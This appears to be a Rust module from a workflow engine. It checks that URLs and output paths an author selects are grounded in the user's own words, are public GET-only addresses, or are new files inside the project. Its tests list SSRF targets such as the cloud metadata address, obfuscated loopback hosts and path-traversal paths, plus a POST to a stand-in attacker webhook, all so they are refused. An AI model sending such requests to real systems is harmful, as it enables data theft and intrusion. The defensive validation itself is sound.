// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! The selections an author states rather than copies: a public source the request names
//! (« Hacker News »), public sources chosen within a delegation (« les sources publiques, tu les
//! choisis »), a routine new output inside the project, a value the person typed, accepted or
//! kept. Each carries its provenance and the person's words that authorize it. A selection is
//! admitted only when those words are the person's (verbatim in what they stated), its value
//! fits the scope of its role, and the document uses it in that role alone; an admitted
//! selection covers its literal for Law 2 ([`crate::fidelity::laws_resolved`]): it is neither an
//! invented literal nor a human answer. The scope never widens an effect: a delegated or named
//! source is a public address read with GET; a derived output is a new file inside the project.
//! Nothing here grants a permit, a Save or a Run, and the Check still judges the document whole.

use nika_types::net;
use serde_json::Value;

use super::Diagnostic;

/// Where a selected value comes from.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
#[non_exhaustive]
pub enum ResolutionKind {
    /// A public source the person named, resolved to its address.
    Named,
    /// Chosen within the latitude the person delegated.
    Delegated,
    /// A routine new value the request asks for without naming it (an output file's name).
    Derived,
    /// The concrete value of an offer the person accepted (the host verifies the offer).
    Offered,
    /// Typed by the person, read in context.
    Answered,
    /// Kept unchanged from an earlier accepted revision (the host verifies the binding).
    Retained,
}

impl ResolutionKind {
    /// The kind a word names, if it is one.
    #[must_use]
    pub fn parse(word: &str) -> Option<Self> {
        Some(match word {
            "named" => Self::Named,
            "delegated" => Self::Delegated,
            "derived" => Self::Derived,
            "offered" => Self::Offered,
            "answered" => Self::Answered,
            "retained" => Self::Retained,
            _ => return None,
        })
    }

    /// The stable word.
    #[must_use]
    pub const fn word(self) -> &'static str {
        match self {
            Self::Named => "named",
            Self::Delegated => "delegated",
            Self::Derived => "derived",
            Self::Offered => "offered",
            Self::Answered => "answered",
            Self::Retained => "retained",
        }
    }

    /// Whether only the host that holds the offer or the binding may state it.
    const fn hosted(self) -> bool {
        matches!(self, Self::Offered | Self::Retained)
    }
}

/// What a selected value is for.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
#[non_exhaustive]
pub enum ResolutionRole {
    /// An address the workflow reads.
    ReadSource,
    /// A file the workflow writes.
    OutputPath,
    /// The workflow's run model (validated by the capability inventory, never here).
    RunModel,
    /// Any other value of the workflow.
    Value,
}

impl ResolutionRole {
    /// The role a word names, if it is one.
    #[must_use]
    pub fn parse(word: &str) -> Option<Self> {
        Some(match word {
            "read_source" => Self::ReadSource,
            "output_path" => Self::OutputPath,
            "run_model" => Self::RunModel,
            "value" => Self::Value,
            _ => return None,
        })
    }

    /// The stable word.
    #[must_use]
    pub const fn word(self) -> &'static str {
        match self {
            Self::ReadSource => "read_source",
            Self::OutputPath => "output_path",
            Self::RunModel => "run_model",
            Self::Value => "value",
        }
    }
}

/// One selection: its value, provenance and role, and what authorizes it.
#[derive(Clone, Debug, PartialEq, Eq)]
#[non_exhaustive]
pub struct Resolution {
    /// The value, exactly as the document carries it.
    pub value: String,
    /// Where it comes from.
    pub kind: ResolutionKind,
    /// What it is for.
    pub role: ResolutionRole,
    /// The person's words that authorize it, verbatim.
    pub excerpt: Option<String>,
    /// The person's message those words are read from, when a host keeps messages (`u3`).
    pub message: Option<String>,
    /// The question an offer answered, by its key.
    pub question: Option<String>,
    /// The option of that question the person accepted, by its key.
    pub option: Option<String>,
}

impl Resolution {
    /// A selection with no words attached yet.
    #[must_use]
    pub fn new(value: impl Into<String>, kind: ResolutionKind, role: ResolutionRole) -> Self {
        Self {
            value: value.into(),
            kind,
            role,
            excerpt: None,
            message: None,
            question: None,
            option: None,
        }
    }

    /// The same selection, authorized by `excerpt`.
    #[must_use]
    pub fn with_excerpt(mut self, excerpt: impl Into<String>) -> Self {
        self.excerpt = Some(excerpt.into());
        self
    }

    /// One row as an author states it: `{"value", "kind", "role", "excerpt"?, "message"?,
    /// "question"?, "option"?}`.
    ///
    /// # Errors
    /// What the row lacks or names wrongly, in words a seat repairs from.
    pub fn read(row: &Value) -> Result<Self, String> {
        let text = |key: &str| row.get(key).and_then(Value::as_str).map(str::to_owned);
        let value = text("value")
            .filter(|v| !v.trim().is_empty())
            .ok_or("a selection states its `value`")?;
        let kind = text("kind")
            .as_deref()
            .and_then(ResolutionKind::parse)
            .ok_or_else(|| format!("`{value}` states no known `kind` (named, delegated, derived, offered, answered, retained)"))?;
        let role = text("role")
            .as_deref()
            .and_then(ResolutionRole::parse)
            .ok_or_else(|| {
                format!(
                    "`{value}` states no known `role` (read_source, output_path, run_model, value)"
                )
            })?;
        Ok(Self {
            value,
            kind,
            role,
            excerpt: text("excerpt"),
            message: text("message"),
            question: text("question"),
            option: text("option"),
        })
    }

    /// Every row of `rows`, read in order; the first unreadable row refuses them all.
    ///
    /// # Errors
    /// The unreadable row, by its place and what it lacks.
    pub fn read_all(rows: &[Value]) -> Result<Vec<Self>, String> {
        rows.iter()
            .enumerate()
            .map(|(at, row)| Self::read(row).map_err(|why| format!("selection {}: {why}", at + 1)))
            .collect()
    }

    /// The row a record keeps.
    #[must_use]
    pub fn to_json(&self) -> Value {
        let mut row = serde_json::json!({"value": self.value, "kind": self.kind.word(),
            "role": self.role.word()});
        for (key, field) in [
            ("excerpt", &self.excerpt),
            ("message", &self.message),
            ("question", &self.question),
            ("option", &self.option),
        ] {
            if let Some(text) = field {
                row[key] = Value::String(text.clone());
            }
        }
        row
    }
}

/// The literals the admitted selections cover, and one diagnostic per selection refused.
/// `stated` is the text the person's words are read from (the request, and the answers or
/// messages a host keeps); `host` holds selections the host verified itself (an offer it showed,
/// a binding it kept): their scope and use are judged, their words are not read again; an
/// author may not state those two kinds. `world` is the host's observation of the project.
#[must_use]
pub fn admitted(
    stated: &str,
    doc: &Value,
    (authored, host): (&[Resolution], &[Resolution]),
    world: Option<&Value>,
    out: &mut Vec<Diagnostic>,
) -> Vec<String> {
    let mut covered = Vec::new();
    for (selection, verified) in authored
        .iter()
        .map(|s| (s, false))
        .chain(host.iter().map(|s| (s, true)))
    {
        match refusal(stated, doc, selection, verified, world) {
            Some(message) => out.push(Diagnostic {
                kind: "resolution",
                message,
            }),
            None => covered.push(selection.value.clone()),
        }
    }
    covered
}

/// Why `selection` is refused, or `None` when it is admitted.
fn refusal(
    stated: &str,
    doc: &Value,
    selection: &Resolution,
    verified: bool,
    world: Option<&Value>,
) -> Option<String> {
    let (value, kind) = (selection.value.as_str(), selection.kind.word());
    if !verified {
        if selection.kind.hosted() {
            return Some(format!(
                "UNAUTHORIZED SELECTION: `{value}` is stated as {kind}: only the Session that showed the offer or kept the value states that; cite the person's own words instead."
            ));
        }
        let Some(excerpt) = selection
            .excerpt
            .as_deref()
            .filter(|e| !e.trim().is_empty())
        else {
            return Some(format!(
                "UNAUTHORIZED SELECTION: `{value}` ({kind}) cites no words of the person; cite the words of the request that ask for it, or ask the person."
            ));
        };
        if !anchored(stated, excerpt) {
            return Some(format!(
                "UNAUTHORIZED SELECTION: `{value}` cites « {excerpt} », which is not in the request or the person's answers; cite their own words verbatim, or ask them."
            ));
        }
        if let Some(why) = misplaced(stated, selection) {
            return Some(why);
        }
    }
    match selection.role {
        ResolutionRole::ReadSource => read_source_refusal(doc, value, kind),
        ResolutionRole::OutputPath => output_refusal(doc, value, selection.kind, world),
        ResolutionRole::RunModel | ResolutionRole::Value => None,
    }
}

/// Why an author's selection may not take its role. Only a read source and a new output can
/// stand for a value the person did not spell: a named or delegated selection is a read source,
/// a derived one a new output, and an answered value is one the person typed, verbatim. Any
/// other pairing would let a literal nobody wrote pass as stated.
fn misplaced(stated: &str, selection: &Resolution) -> Option<String> {
    let (value, kind, role) = (
        selection.value.as_str(),
        selection.kind.word(),
        selection.role.word(),
    );
    let fits = match selection.kind {
        ResolutionKind::Named | ResolutionKind::Delegated => {
            selection.role == ResolutionRole::ReadSource
        }
        ResolutionKind::Derived => selection.role == ResolutionRole::OutputPath,
        ResolutionKind::Answered => anchored(stated, value),
        ResolutionKind::Offered | ResolutionKind::Retained => true,
    };
    (!fits).then(|| match selection.kind {
        ResolutionKind::Answered => format!(
            "UNAUTHORIZED SELECTION: `{value}` is stated as answered, but the person's words do not contain it; an answered value is one they typed, verbatim."
        ),
        _ => format!(
            "UNAUTHORIZED SELECTION: `{value}` is stated as {kind} for the role {role}: a named or delegated selection is a read source and a derived one a new output; any other value must be the person's own words."
        ),
    })
}

/// Whether `excerpt` is verbatim in `stated`, spacing and typographic quotes aside.
fn anchored(stated: &str, excerpt: &str) -> bool {
    let fold = |text: &str| {
        text.replace(['\u{2019}', '\u{2018}'], "'")
            .replace(['\u{201c}', '\u{201d}'], "\"")
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ")
    };
    let excerpt = fold(excerpt);
    !excerpt.is_empty() && fold(stated).contains(&excerpt)
}

/// A read source is a public http(s) address the workflow reads with GET, and nothing else.
fn read_source_refusal(doc: &Value, value: &str, kind: &str) -> Option<String> {
    if let Err(why) = public_address(value) {
        return Some(format!(
            "OUT OF SCOPE: `{value}` is not a public address ({why}); a {kind} source is read from a public http(s) address only, never a private, local or credentialed one."
        ));
    }
    let misused = uses(doc, value)
        .into_iter()
        .find(|(_, tool, method, field)| !reads_with_get(tool, method.as_deref(), field));
    misused.map(|(task, ..)| format!(
        "OUT OF SCOPE: `{value}` is a {kind} read source: it is read with GET, never POST, sent to or written; task `{task}` uses it otherwise."
    ))
}

/// A derived output is a new file inside the project, only written.
fn output_refusal(
    doc: &Value,
    value: &str,
    kind: ResolutionKind,
    world: Option<&Value>,
) -> Option<String> {
    if !in_project(value) {
        return Some(format!(
            "OUT OF SCOPE: `{value}` is not a file inside the project: an output is a relative path under the project root, never absolute, hidden or above it."
        ));
    }
    if kind == ResolutionKind::Derived && !value.is_ascii() {
        return Some(format!(
            "OUT OF SCOPE: `{value}` is a derived name outside plain ASCII: a file system may hold it under another spelling; derive a plain ASCII name."
        ));
    }
    if kind == ResolutionKind::Derived && observed_file(world, value) {
        return Some(format!(
            "OUT OF SCOPE: `{value}` already exists in the project: a derived output never replaces a file; ask the person whether to replace it, or derive a new name."
        ));
    }
    let misused = uses(doc, value)
        .into_iter()
        .find(|(_, tool, _, field)| !(tool == "nika:write" && field == "path"));
    misused.map(|(task, ..)| format!(
        "OUT OF SCOPE: `{value}` is a derived output: it is only written by `nika:write`; task `{task}` uses it otherwise."
    ))
}

/// Whether a use reads its address: a `nika:fetch` URL read with GET (the default) or HEAD.
fn reads_with_get(tool: &str, method: Option<&str>, field: &str) -> bool {
    let method = method.map_or("GET".to_owned(), str::to_ascii_uppercase);
    tool == "nika:fetch" && field == "url" && matches!(method.as_str(), "GET" | "HEAD")
}

/// Each effectful use of `value` by a task: `(task, tool, method, argument)`. A task's words
/// (a prompt, an instruction) are text, not a use; a tool argument holding the value, directly
/// or through a bare `${{ const.<name> }}`, is one, and so is an `exec` command naming it.
fn uses(doc: &Value, value: &str) -> Vec<(String, String, Option<String>, String)> {
    let mut found = Vec::new();
    let Some(tasks) = doc.get("tasks").and_then(Value::as_object) else {
        return found;
    };
    for (id, task) in tasks {
        if let Some(command) = task.get("exec") {
            if mentions(doc, command, value) {
                found.push((id.clone(), "exec".to_owned(), None, "command".to_owned()));
            }
            continue;
        }
        let Some(invoke) = task.get("invoke") else {
            continue;
        };
        let tool = invoke["tool"].as_str().unwrap_or_default().to_owned();
        let method = invoke["args"]["method"].as_str().map(str::to_owned);
        for (field, arg) in invoke["args"].as_object().into_iter().flatten() {
            if mentions(doc, arg, value) {
                found.push((id.clone(), tool.clone(), method.clone(), field.clone()));
            }
        }
    }
    found
}

/// Whether `node` holds `value`: a string carrying it, a bare `${{ const.<name> }}` whose
/// constant does, or any element of an array or object that does.
fn mentions(doc: &Value, node: &Value, value: &str) -> bool {
    match node {
        Value::String(text) => {
            let resolved = const_value(doc, text);
            same_literal(text, value)
                || text.contains(value)
                || resolved.is_some_and(|c| same_literal(&c, value) || c.contains(value))
        }
        Value::Array(items) => items.iter().any(|item| mentions(doc, item, value)),
        Value::Object(map) => map.values().any(|item| mentions(doc, item, value)),
        _ => false,
    }
}

/// The string a bare `${{ const.<name> }}` reads, when the document declares it.
fn const_value(doc: &Value, text: &str) -> Option<String> {
    let name = text
        .trim()
        .strip_prefix("${{")?
        .strip_suffix("}}")?
        .trim()
        .strip_prefix("const.")?;
    doc.get("const")?
        .get(name.trim())?
        .as_str()
        .map(str::to_owned)
}

/// Whether two literals name the same thing: equal, a trailing `/` of an address aside, or a
/// leading `./` of a relative path aside.
#[must_use]
pub fn same_literal(a: &str, b: &str) -> bool {
    let plain = |text: &str| {
        let text = text.trim();
        let text = text.strip_prefix("./").unwrap_or(text);
        text.trim_end_matches('/').to_owned()
    };
    !a.trim().is_empty() && plain(a) == plain(b)
}

/// Whether `path` is a relative path under the project root: not absolute, not from a home,
/// no parent, hidden or empty component, and a file name.
fn in_project(path: &str) -> bool {
    let path = path.trim();
    let body = path.strip_prefix("./").unwrap_or(path);
    !body.is_empty()
        && !body.starts_with('/')
        && !body.starts_with('~')
        && !body.contains('\\')
        && !body.contains("://")
        && !body.ends_with('/')
        && body
            .split('/')
            .all(|part| !part.is_empty() && !part.starts_with('.'))
}

/// Whether the host's observation places an existing file at `path`, letter case aside: a
/// case-insensitive file system (the macOS default) holds both spellings as one file.
fn observed_file(world: Option<&Value>, path: &str) -> bool {
    let path = path.to_lowercase();
    (world
        .and_then(|w| w["observed"].as_array())
        .into_iter()
        .flatten())
    .any(|row| {
        row["state"] == "observed"
            && row["path"]
                .as_str()
                .is_some_and(|observed| same_literal(&observed.to_lowercase(), &path))
    })
}

/// The special-use names the SSRF floor leaves to resolution (RFC 6762 · RFC 7686 · RFC 8375 ·
/// RFC 9476) and the private-use `internal`: none names a public host.
const SPECIAL_NAMES: [&str; 5] = ["local", "internal", "home.arpa", "onion", "alt"];

/// Why `url` is not a public http(s) address: no scheme or another one, credentials in its
/// authority, no host, or a host the engine's SSRF floor refuses
/// (`nika_types::net::host_is_blocked`, the one oracle the fetch effect and `nika check` read), a
/// documentation name (`is_documentation_host`), or a special-use name no public host carries. A
/// public-looking name that resolves to a private address is refused at run time by the fetch
/// effect's own guard, never here.
fn public_address(url: &str) -> Result<(), &'static str> {
    let (scheme, rest) = url.trim().split_once("://").ok_or("no http(s) scheme")?;
    if !matches!(scheme.to_ascii_lowercase().as_str(), "http" | "https") {
        return Err("not an http(s) address");
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
    if authority.contains('@') {
        return Err("credentials in the address");
    }
    let host = match authority.strip_prefix('[') {
        Some(bracketed) => bracketed.split(']').next().unwrap_or_default(),
        None => authority.split(':').next().unwrap_or_default(),
    };
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    if host.is_empty() {
        return Err("no host");
    }
    if net::host_is_blocked(&host) {
        return Err("a local, private or reserved host the fetch floor refuses");
    }
    if host.parse::<std::net::IpAddr>().is_ok() {
        return Ok(());
    }
    // A host of numbers that is no canonical address (`127.1`, `0x7f.0.0.1`, `0177.0.0.1`):
    // resolvers may read it as one the floor would refuse.
    let number = |label: &str| {
        let hex = label
            .strip_prefix("0x")
            .or_else(|| label.strip_prefix("0X"));
        match hex {
            Some(digits) => !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_hexdigit()),
            None => !label.is_empty() && label.bytes().all(|b| b.is_ascii_digit()),
        }
    };
    if host.split('.').all(number) {
        return Err("a numeric host that is no canonical address");
    }
    if net::is_documentation_host(&host) {
        return Err("a documentation name, not a live address");
    }
    // A special-use name names no public host, nor does a single label.
    let special = SPECIAL_NAMES
        .iter()
        .any(|name| host == *name || host.ends_with(&format!(".{name}")));
    if special || !host.contains('.') {
        return Err("a local or reserved host name");
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const REQUEST: &str = "Récupère les news tech de Hacker News, résume-les et écris le résumé en Markdown dans un dossier du projet. Les autres sources publiques, tu les choisis toi-même.";

    /// A digest reading `sources` with `method` and writing `output`.
    fn doc(sources: &[&str], method: &str, output: &str) -> Value {
        let mut tasks = serde_json::Map::new();
        for (n, url) in sources.iter().enumerate() {
            tasks.insert(
                format!("source_{n}"),
                json!({"invoke": {"tool": "nika:fetch", "args": {"url": url, "method": method}}}),
            );
        }
        tasks.insert(
            "write".to_owned(),
            json!({"invoke": {"tool": "nika:write", "args": {"path": output, "content": "x"}}}),
        );
        json!({ "tasks": tasks })
    }

    fn named(value: &str, excerpt: &str) -> Resolution {
        Resolution::new(value, ResolutionKind::Named, ResolutionRole::ReadSource)
            .with_excerpt(excerpt)
    }

    fn delegated(value: &str) -> Resolution {
        Resolution::new(value, ResolutionKind::Delegated, ResolutionRole::ReadSource)
            .with_excerpt("Les autres sources publiques, tu les choisis toi-même")
    }

    fn derived(value: &str) -> Resolution {
        Resolution::new(value, ResolutionKind::Derived, ResolutionRole::OutputPath)
            .with_excerpt("écris le résumé en Markdown dans un dossier du projet")
    }

    fn judge(
        doc: &Value,
        authored: &[Resolution],
        host: &[Resolution],
        world: Option<&Value>,
    ) -> (Vec<String>, Vec<String>) {
        let mut out = Vec::new();
        let covered = admitted(REQUEST, doc, (authored, host), world, &mut out);
        (covered, out.into_iter().map(|d| d.message).collect())
    }

    #[test]
    fn anchored_public_selections_in_their_role_are_admitted() {
        let doc = doc(
            &[
                "https://news.ycombinator.com",
                "https://www.lemonde.fr/international/",
            ],
            "GET",
            "./news/digest.md",
        );
        let rows = [
            named("https://news.ycombinator.com", "Hacker News"),
            delegated("https://www.lemonde.fr/international/"),
            derived("./news/digest.md"),
        ];
        let (covered, refused) = judge(&doc, &rows, &[], None);
        assert!(refused.is_empty(), "{refused:?}");
        assert_eq!(
            covered,
            [
                "https://news.ycombinator.com",
                "https://www.lemonde.fr/international/",
                "./news/digest.md"
            ]
        );
    }

    #[test]
    fn a_selection_needs_the_persons_own_words() {
        let doc = doc(&["https://news.ycombinator.com"], "GET", "./news/digest.md");
        let unanchored = named("https://news.ycombinator.com", "mes sources préférées");
        let silent = Resolution::new(
            "https://news.ycombinator.com",
            ResolutionKind::Delegated,
            ResolutionRole::ReadSource,
        );
        for row in [unanchored, silent] {
            let (covered, refused) = judge(&doc, std::slice::from_ref(&row), &[], None);
            assert!(covered.is_empty(), "{row:?}");
            assert!(
                refused[0].starts_with("UNAUTHORIZED SELECTION"),
                "{refused:?}"
            );
        }
        // Spacing and typographic quotes aside, the words are the person's.
        let spaced = named("https://news.ycombinator.com", "news  tech de Hacker News");
        assert!(
            judge(&doc, std::slice::from_ref(&spaced), &[], None)
                .1
                .is_empty()
        );
    }

    #[test]
    fn an_offer_or_a_kept_value_is_the_hosts_to_state() {
        let doc = doc(&["https://news.ycombinator.com"], "GET", "./news/digest.md");
        for kind in [ResolutionKind::Offered, ResolutionKind::Retained] {
            let row = Resolution::new(
                "https://news.ycombinator.com",
                kind,
                ResolutionRole::ReadSource,
            )
            .with_excerpt("Hacker News");
            let (covered, refused) = judge(&doc, std::slice::from_ref(&row), &[], None);
            assert!(
                covered.is_empty() && refused[0].contains(kind.word()),
                "{refused:?}"
            );
            // The host that showed the offer states it: its words are not read again.
            let (covered, refused) = judge(&doc, &[], std::slice::from_ref(&row), None);
            assert!(refused.is_empty(), "{refused:?}");
            assert_eq!(covered, ["https://news.ycombinator.com"]);
        }
    }

    #[test]
    fn a_delegated_source_is_a_public_address_read_with_get() {
        for private in [
            "http://192.168.1.20/flux.xml",
            "http://10.0.0.7/rss",
            "http://127.0.0.1:8080/",
            "http://localhost/feed",
            "https://intranet/news",
            "https://news.internal/feed",
            "http://[::1]/",
            "http://[fd00::1]/",
            "https://user:secret@news.example.org/",
            "ftp://news.example.org/",
            "http://100.64.1.2/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "http://[::ffff:10.0.0.1]/",
            "https://api.example.com/feed",
            "https://news.test/rss",
            "http://printer.local/",
            "http://127.1/",
            "http://0x7f.0.0.1/",
            "http://0177.0.0.1/",
            "http://2130706433/",
        ] {
            let doc = doc(&[private], "GET", "./news/digest.md");
            let (covered, refused) = judge(&doc, &[delegated(private)], &[], None);
            assert!(covered.is_empty(), "{private}");
            assert!(
                refused[0].contains("not a public address") && refused[0].contains(private),
                "{private}: {refused:?}"
            );
        }
        let hacker_news = "https://news.ycombinator.com";
        let posted = doc(&[hacker_news], "POST", "./news/digest.md");
        let (_, refused) = judge(&posted, &[delegated(hacker_news)], &[], None);
        assert!(
            refused[0].contains("GET") && refused[0].contains("POST"),
            "{refused:?}"
        );
        let head = doc(&[hacker_news], "head", "./news/digest.md");
        let (_, refused) = judge(&head, &[delegated(hacker_news)], &[], None);
        assert!(refused.is_empty(), "{refused:?}");
    }

    #[test]
    fn a_derived_output_is_a_new_file_inside_the_project_only_written() {
        for outside in [
            "/etc/digest.md",
            "../digest.md",
            "~/digest.md",
            "./.nika/digest.md",
            "./news/",
        ] {
            let doc = doc(&["https://news.ycombinator.com"], "GET", outside);
            let (covered, refused) = judge(&doc, &[derived(outside)], &[], None);
            assert!(covered.is_empty(), "{outside}");
            assert!(
                refused[0].contains("inside the project"),
                "{outside}: {refused:?}"
            );
        }
        let world = json!({"observed": [{"path": "./news/digest.md", "state": "observed"}]});
        let written = doc(&["https://news.ycombinator.com"], "GET", "news/digest.md");
        let (_, refused) = judge(&written, &[derived("./news/digest.md")], &[], Some(&world));
        assert!(refused[0].contains("already exists"), "{refused:?}");
        // An absent observation is no file.
        let absent = json!({"observed": [{"path": "./news/digest.md", "state": "absent"}]});
        let (_, refused) = judge(&written, &[derived("./news/digest.md")], &[], Some(&absent));
        assert!(refused.is_empty(), "{refused:?}");
        // Read rather than written: refused.
        let read = json!({"tasks": {"read": {"invoke": {"tool": "nika:read",
            "args": {"path": "./news/digest.md"}}}}});
        let (_, refused) = judge(&read, &[derived("./news/digest.md")], &[], None);
        assert!(refused[0].contains("only written"), "{refused:?}");
    }

    /// A case-insensitive file system holds `news/Digest.md` and `news/digest.md` as one file,
    /// and a non-ASCII name may be held under another Unicode form: a derived name never
    /// replaces a file through either.
    #[test]
    fn a_derived_output_never_aliases_a_file_the_project_holds() {
        let world = json!({"observed": [{"path": "news/Digest.md", "state": "observed"}]});
        let written = doc(&["https://news.ycombinator.com"], "GET", "./news/digest.md");
        let (covered, refused) = judge(&written, &[derived("./news/digest.md")], &[], Some(&world));
        assert!(covered.is_empty());
        assert!(refused[0].contains("already exists"), "{refused:?}");
        let accented = doc(&["https://news.ycombinator.com"], "GET", "./news/résumé.md");
        let (covered, refused) = judge(&accented, &[derived("./news/résumé.md")], &[], None);
        assert!(covered.is_empty());
        assert!(refused[0].contains("plain ASCII"), "{refused:?}");
    }

    /// Only a read source and a new output can stand for words the person did not spell: a
    /// selection of another role covers a literal only when the person typed it.
    #[test]
    fn a_selection_takes_only_the_role_its_kind_authorizes() {
        let webhook = "https://collector.attacker.net/x";
        let sent = json!({"tasks": {"send": {"invoke": {"tool": "nika:fetch",
            "args": {"url": webhook, "method": "POST"}}}}});
        let rows = [
            Resolution::new(webhook, ResolutionKind::Answered, ResolutionRole::Value)
                .with_excerpt("news"),
            Resolution::new(webhook, ResolutionKind::Named, ResolutionRole::Value)
                .with_excerpt("Hacker News"),
            Resolution::new(webhook, ResolutionKind::Delegated, ResolutionRole::RunModel)
                .with_excerpt("tu les choisis toi-même"),
            Resolution::new(
                "./news/digest.md",
                ResolutionKind::Delegated,
                ResolutionRole::OutputPath,
            )
            .with_excerpt("tu les choisis toi-même"),
            Resolution::new(webhook, ResolutionKind::Derived, ResolutionRole::ReadSource)
                .with_excerpt("dans un dossier du projet"),
        ];
        for row in rows {
            let (covered, refused) = judge(&sent, std::slice::from_ref(&row), &[], None);
            assert!(covered.is_empty(), "{row:?}");
            assert!(
                refused[0].starts_with("UNAUTHORIZED SELECTION"),
                "{row:?}: {refused:?}"
            );
        }
        // A value the person typed, verbatim, is theirs in any role.
        let typed = Resolution::new("Markdown", ResolutionKind::Answered, ResolutionRole::Value)
            .with_excerpt("en Markdown");
        let (covered, refused) = judge(&sent, std::slice::from_ref(&typed), &[], None);
        assert!(refused.is_empty(), "{refused:?}");
        assert_eq!(covered, ["Markdown"]);
    }

    #[test]
    fn a_constant_carries_its_selection_to_the_argument_that_reads_it() {
        let doc = json!({"const": {"source": "https://news.ycombinator.com"},
            "tasks": {"send": {"invoke": {"tool": "nika:fetch",
                "args": {"url": "${{ const.source }}", "method": "POST"}}}}});
        let (_, refused) = judge(
            &doc,
            &[delegated("https://news.ycombinator.com")],
            &[],
            None,
        );
        assert!(refused[0].contains("task `send`"), "{refused:?}");
    }

    #[test]
    fn a_row_reads_back_as_it_was_stated() {
        let row = json!({"value": "./news/digest.md", "kind": "derived", "role": "output_path",
            "excerpt": "dans un dossier du projet", "message": "u1"});
        let read = Resolution::read(&row).expect("a row");
        assert_eq!(read.to_json(), row);
        for (bad, why) in [
            (json!({"kind": "named", "role": "read_source"}), "value"),
            (
                json!({"value": "x", "kind": "guessed", "role": "read_source"}),
                "kind",
            ),
            (
                json!({"value": "x", "kind": "named", "role": "elsewhere"}),
                "role",
            ),
        ] {
            let error = Resolution::read_all(&[bad]).expect_err("refused");
            assert!(
                error.starts_with("selection 1:") && error.contains(why),
                "{error}"
            );
        }
    }

    #[test]
    fn literals_are_the_same_with_or_without_their_decorations() {
        assert!(same_literal("./news/digest.md", "news/digest.md"));
        assert!(same_literal(
            "https://www.lemonde.fr/international/",
            "https://www.lemonde.fr/international"
        ));
        assert!(!same_literal(
            "https://news.ycombinator.com",
            "https://news.ycombinator.co"
        ));
        assert!(!same_literal("", ""));
    }
}
